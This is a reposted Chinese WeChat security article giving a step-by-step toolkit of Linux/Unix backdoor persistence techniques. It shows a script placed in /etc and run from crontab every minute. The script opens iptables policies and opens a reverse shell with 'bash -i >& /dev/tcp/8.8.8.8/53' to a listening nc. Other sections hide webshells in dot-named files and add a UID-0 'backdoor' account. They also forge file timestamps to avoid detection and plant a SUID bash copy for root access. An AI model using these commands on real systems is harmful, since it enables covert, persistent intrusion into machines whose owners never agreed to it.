> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_DqXZjkD3fnR7HVAB9pKvw)

![](https://mmbiz.qpic.cn/mmbiz_gif/cW8GezRBf38VQw73hmM9EJNpnjLStNutQRj5Nk7BicuEvvAutUkD5fJXv7bqkHqVZUh1juSohKHzSibCPTXmUCzw/640?wx_fmt=gif)

**0x01  UnixBash 运控后门**

**简介：**

      利用 Unix/Linux 自带的 Bash 和 Croud 实现远控功能，保持反弹上线到公网服务器。

**方法如下：**

1、创建 / etc/xxx 脚本文件，利用该脚本进行反弹。以下脚本代表全自动反弹到 8.8.8.8 的 53 端口上。

```
nano /etc/xxx
#!/bin/bash
if netstat -ano|grep -v grep|grep "8.8.8.8" > /dev/null
then
echo "OK" > /dev/null
else
/sbin/iptables --policy INPUT ACCEPT
/sbin/iptables --policy OUTPUT ACCEPT
bash -i >& /dev/tcp/8.8.8.8/53 0>&1
fi
chmod +sx /etc/xxx（文件名称自拟）
```

2、修改 / etc/crontab，让其定时执行。  

```
nano /etc/crontab
```

--> 在 / etc/crontab 文件末添加下述代码可实现每一分钟执行一次。  

```
*/1****root/etc/xxx
```

3、重启 crontab 服务。（不同发行版本重启方式不同，请自行查询！）  

```
service cron reload
service cron start
```

4、在 8.8.8.8 的服务器上使用 NC 接收 Shell 即可。  

```
nc -vv -lp 53
```

**0x02  Linux/Unix 隐藏文件和文件夹**

      Linux/Unix 下想隐藏 Webshell 或者后门之类的，可以利用隐藏文件和文件夹。

**方法一：**

      可创建一个名字开头带 . 的 Webshell 或者文件夹，默认情况下是不会显示出来的，访问的时候加点访问即可。（查看方法：ls -a）

```
touch .webshell.php (创建名为.webshell.php的文件)
mkdir .backdoor/ (创建名称为.backdoor的文件夹)
```

**终极方法：**  

      如果是文件的话浏览器访问直接输 ... 就行，目录同理。  

```
touch ... (创建名字为...的文件)
mkdir ... (创建名字为...的文件夹)
```

**0x03  Linux/Unix 添加 UID 为 0 的用户**

**简介：**

      在 Unix 体系下，UID 为 0 就是 root 权限。所以渗透的时候可以添加一个 UID 为 0 的用户作为后门。

**利用方法：**

```
useradd -o -u 0 backdoor
```

**0x04  Linux/Unix 修改文件时间戳**

**简介：**

      Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以。比如参考 index.php 的时间，再赋给 webshell.php，就可以使两个文件的时间一致。

**利用方法：**

```
touch -r index.php webshell.php
```

      或者直接将时间戳改为某年某月某日。如下 2014 年 01 月 02 日。  

**系统环境：**  

```
dawg:~# uname -a
Linux dawg 2.4.20-1-386 #3 Sat Mar 22 12:11:40 EST 2003 i686 GNU/Linux
```

**0x05  SUID shell**

**利用方法：**

      首先，先切换为 root 用户，并执行以下命令：

```
dawg:~# cp /bin/bash /.woot
dawg:~# chmod 4755 /.woot
dawg:~# ls -al /.woot
-rwsr-xr-x 1 root root 690668 Jul 24 17:14 /.woot
```

      当然，你也可以起其他更具隐藏性的名字，我想猥琐并机智的你，肯定能想出很多好的名字。文件前面的 . 也不是必要的，只是为了隐藏文件（在文件名的最前面加上 “.”，就可以在任意文件目录下进行隐藏）。  

      现在，作为一个普通用户，我们来启用这个后门。  

```
fw@dawg:~$ id
uid=1000(fw) gid=1000(fw) groups=1000(fw)
fw@dawg:~$ /.woot.woot-2.05b$ id
uid=1000(fw) gid=1000(fw) groups=1000(fw).woot-2.05b$
```

      为什么不行呢？  

      因为 bash2 针对 suid 有一些护卫的措施，但这也不是不可破的：  

```
.woot-2.05b$ /.woot -p
.woot-2.05b# id
uid=1000(fw) gid=1000(fw) euid=1000(fw) groups=1000(fw)
```

      使用 - p 参数来获取一个 root shell。（其中 euid 的意思是 effective user id）  

      这里要特别注意的是，作为一个普通用户执行这个 SUID shell 时，一定要使用全路径。

**小知识：**

      如何查找那些具有 SUID 的文件：  

```
dawg:~# find /-perm +4000 -ls
```

      这时就会返回具有 SUID 位的文件啦~

![](https://mmbiz.qpic.cn/mmbiz_png/c6gqmhWiafypu8xMx0VGdz69F9YhVguXuShCP9urC7Rs8gp9VxicGvOibPfzGslmPiaWM2rg1qHvnibibcEsCicnIoZmg/640?wx_fmt=png) 

往期推荐

  

  

[3601 病毒分析](http://mp.weixin.qq.com/s?__biz=MzA5MDE2ODI0NQ==&mid=2247485560&idx=1&sn=048f0b6bb05dfb6642c41c9e2d8d6198&chksm=900e86a2a7790fb42ddea5b4548fb5c51d3f92a061307fc746c688eb2d98da3263dc16135e92&scene=21#wechat_redirect)

  

[网安笔记 | 非法网站渗透](http://mp.weixin.qq.com/s?__biz=MzA5MDE2ODI0NQ==&mid=2247485560&idx=2&sn=0a6d85a1c70a9d8902d99c90a1d7fd61&chksm=900e86a2a7790fb4dd6d7a75474be7beced84245e7f3c0b39579955077f7e8d4ad2355552d02&scene=21#wechat_redirect)

  

[PhpWeb CMS 前台 Getshell](http://mp.weixin.qq.com/s?__biz=MzA5MDE2ODI0NQ==&mid=2247485421&idx=1&sn=63eb781ffcdc36e4c7fcdfd9117cc54a&chksm=900e8937a7790021be02a0425255b7bbe1034dc39a34054b36290f774b91ede04d4a3a89d3ae&scene=21#wechat_redirect)

  

[WarmUp | 滑稽的代码审计](http://mp.weixin.qq.com/s?__biz=MzA5MDE2ODI0NQ==&mid=2247485421&idx=2&sn=641ca30e3f944181a9a5931189b06c56&chksm=900e8937a7790021394b0aaf0f9272cc0b191ea2a76ed5c3a72beb4a0e649f357ead8d31a3bf&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/6aVaON9Kibf5VNYt0ibwA6m1BvnXYFSnVn8icyic45TuQk1ib633LibS0HKWYQ6qz0yBLo894U0T52O2YEtyP3iaB7P1w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/5mCYKkWvZAh6zJBCiaXHKIpUycpKkr5ZVic0MtG1eibric9weY8PtSB23R7OKFb1AlGG0kbaKXyYhOiao6D8UK9KrqA/640?wx_fmt=jpeg)

长按二维码

关注我们吧

![](https://mmbiz.qpic.cn/mmbiz_png/US10Gcd0tQENdoltlmlstW79v8ibDFelROfzwpmcZ6r2ZINfyXOc24AVAON65c7shCuT1l1bz7ziavNMZSApBnhg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/NuIcic2jibgNJzwoZYCo6ThfOoeX410mwuDxnOnv5za18VZJ7ib30pic2NSNnicziaONicvs1C9yMDr6zV40ADD9yPP7Q/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/5mCYKkWvZAiaFXU9Shv9qyNibMjicOgIyic9vU88IQAMqhtuaUAN04xHhnicbT112sfdFe9mIG187l80j0onqHKdobQ/640?wx_fmt=png)

注：本文转载自 SecPulse 安全脉搏，可点击左下角阅读原文查看详情！